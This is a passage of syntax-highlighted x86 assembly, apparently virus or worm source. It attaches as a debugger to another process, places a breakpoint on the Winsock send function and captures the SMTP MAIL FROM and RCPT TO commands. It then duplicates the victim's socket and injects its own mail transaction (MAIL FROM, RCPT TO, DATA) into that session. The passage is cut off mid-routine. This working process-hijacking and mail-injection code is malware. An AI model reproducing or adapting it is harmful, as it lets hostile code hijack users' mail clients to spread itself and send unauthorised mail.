</span><span class="sc5">DEBUG_EVENT__EXCEPTION</span><span class="sc0">      </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc5">SINGLE_STEP</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000100h</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">HandleTargetException</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">DEBUG_EVENT__EXCEPTION.DEE_ExceptionRecord</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc1">;Inside single-step?</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">EXCEPTION_SINGLE_STEP</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">DoSingleStep</span><span class="sc0">

                </span><span class="sc1">;Break-point exception?</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">EXCEPTION_BREAKPOINT</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">DoBreakPoint</span><span class="sc0">

</span><span class="sc5">SkipException</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">DBG_EXCEPTION_NOT_HANDLED</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Go4NewDebugEvent</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">DoSingleStep</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc1">;Re-patch api</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_send</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SetBreakPointOnAPI</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ExitSingleStep</span><span class="sc0">

                </span><span class="sc1">;Get thread handle from current thread id</span><span class="sc0">
                </span><span class="sc1">;on target process</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">DebugEventInfo</span><span class="sc4">+</span><span class="sc2">00000008h</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetThreadHandleFromThreadId</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ExitSingleStep</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">PrepareContext</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_GetThreadContext</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ExitSingleStep</span><span class="sc0">

                </span><span class="sc1">;Stop SINGLE-STEP mode</span><span class="sc0">

                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">CONTEXT.CONTEXT_EFlags</span><span class="sc4">],</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc5">SINGLE_STEP</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_SetThreadContext</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">ExitSingleStep</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ContinueDebug</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">DoBreakPoint</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc1">;First chance?</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">DEBUG_EVENT__EXCEPTION.DEE_dwFirstChance</span><span class="sc4">],</span><span class="sc2">00000000h</span><span class="sc0">

                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">AvoidUnhandledException</span><span class="sc0">

                </span><span class="sc1">;Over our hook?</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">DEBUG_EVENT__EXCEPTION.DEE_ExceptionRecord.ER_ExceptionAddress</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_send</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">AvoidUnhandledException</span><span class="sc0">

                </span><span class="sc1">;Get thread handle from current thread id</span><span class="sc0">
                </span><span class="sc1">;on target process</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">DebugEventInfo</span><span class="sc4">+</span><span class="sc2">00000008h</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetThreadHandleFromThreadId</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">AvoidUnhandledException</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">PrepareContext</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_GetThreadContext</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">AvoidUnhandledException</span><span class="sc0">

                </span><span class="sc1">;Go!</span><span class="sc0">

                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Manipulate__send</span><span class="sc0">

</span><span class="sc5">AvoidUnhandledException</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc1">;Exception has been handled</span><span class="sc0">

                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ContinueDebug</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Manipulate *send*</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;On entry:  esi -&gt; Thread handle</span><span class="sc0">
</span><span class="sc1">;       edi -&gt; Context for process being debugged</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">Manipulate__send</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetSendCallerBuffer</span><span class="sc0">
                </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">exit_Manipulate__send</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">00000004h</span><span class="sc0">               
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetCRC32</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">0d15ec8bch</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">WorkWith__MAIL_FROM</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">6a304c39h</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">WorkWith__RCPT_TO</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">3ddcb44eh</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">WorkWith__DOT</span><span class="sc0">

</span><span class="sc5">exit_Manipulate__send</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

                </span><span class="sc1">;Move EIP back to the INT 03h instruction</span><span class="sc0">
                </span><span class="sc1">;and set the single step flag</span><span class="sc0">

                </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">CONTEXT.CONTEXT_Eip</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">CONTEXT.CONTEXT_EFlags</span><span class="sc4">],</span><span class="sc5">SINGLE_STEP</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_SetThreadContext</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc1">;Remove our breakpoint</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_send</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Org1Byte__send</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc1">;esi &lt;- Ptr to original 1st byte of API code</span><span class="sc0">
                </span><span class="sc1">;edi &lt;- Address of API entry-point</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RemoveBreakPoint</span><span class="sc0">

                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">AvoidUnhandledException</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;WorkWith__MAIL_FROM</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">WorkWith__MAIL_FROM</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">TargetStatus</span><span class="sc4">],</span><span class="sc2">00000000h</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">exit_Manipulate__send</span><span class="sc0">
                
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">TargetStatus</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SizeOf__MAIL_FROM</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">e__MAIL_FROM</span><span class="sc0">

                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">exit_Manipulate__send</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;WorkWith__RCPT_TO</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">WorkWith__RCPT_TO</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">TargetStatus</span><span class="sc4">],</span><span class="sc2">00000001h</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">exit_Manipulate__send</span><span class="sc0">

                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">TargetStatus</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SizeOf__RCPT_TO</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">e__RCPT_TO</span><span class="sc0">

                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">exit_Manipulate__send</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;WorkWith__DOT</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">DUPLICATE_SAME_ACCESS</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000002h</span><span class="sc0">

</span><span class="sc5">SIZEOF_BLOCK_DIVIDER</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">8192</span><span class="sc0">

</span><span class="sc5">WorkWith__DOT</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">TargetStatus</span><span class="sc4">],</span><span class="sc2">00000002h</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">ExitWorkWith__DOT</span><span class="sc0">

                </span><span class="sc1">;Duplicate socket handle</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">DUPLICATE_SAME_ACCESS</span><span class="sc0">          </span><span class="sc1">;dwOptions</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000001h</span><span class="sc0">                  </span><span class="sc1">;bInheritHandle</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">                  </span><span class="sc1">;dwDesiredAccess</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">hDupSocket</span><span class="sc0">              </span><span class="sc1">;lpTargetHandle</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_GetCurrentProcess</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">;hTargetProcessHandle</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Buffer_send_Params</span><span class="sc4">+</span><span class="sc2">00000004h</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;hSourceHandle</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hTargetProcess</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;hSourceProcessHandle</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_DuplicateHandle</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ExitWorkWith__DOT</span><span class="sc0">

                </span><span class="sc1">;Send .</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">                  </span><span class="sc1">;Flags</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">SizeOf__DOT</span><span class="sc0">                </span><span class="sc1">;Size</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">e__DOT</span><span class="sc0">              </span><span class="sc1">;Buffer</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hDupSocket</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;Socket</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_send</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">SizeOf__DOT</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">CloseDupHandle</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RecvSmtpReply</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">CloseDupHandle</span><span class="sc0">

                </span><span class="sc1">;Send MAIL FROM</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">                  </span><span class="sc1">;Flags</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SizeOf__MAIL_FROM</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;Size</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">e__MAIL_FROM</span><span class="sc0">            </span><span class="sc1">;Buffer</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hDupSocket</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;Socket</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_send</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SizeOf__MAIL_FROM</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">CloseDupHandle</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RecvSmtpReply</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">CloseDupHandle</span><span class="sc0">

                </span><span class="sc1">;Send RCPT TO</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">                  </span><span class="sc1">;Flags</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SizeOf__RCPT_TO</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;Size</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">e__RCPT_TO</span><span class="sc0">              </span><span class="sc1">;Buffer</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hDupSocket</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;Socket</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_send</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SizeOf__RCPT_TO</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">CloseDupHandle</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RecvSmtpReply</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">CloseDupHandle</span><span class="sc0">

                </span><span class="sc1">;Send DATA</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">                  </span><span class="sc1">;Flags</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">SizeOf__DATA</span><span class="sc0">               </span><span class="sc1">;Size</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">e__DATA</span><span class="sc0">             </span><span class="sc1">;Buffer</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hDupSocket</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;Socket</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_send</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">SizeOf__DATA</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">CloseDupHandle</span><span class="sc0">
                
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RecvSmtpReply</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">CloseDupHandle</span><span class="sc0">

                </span><span class="sc1">;Send FROM:</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">                  </span><span class="sc1">;Flags</span><span class="sc0">
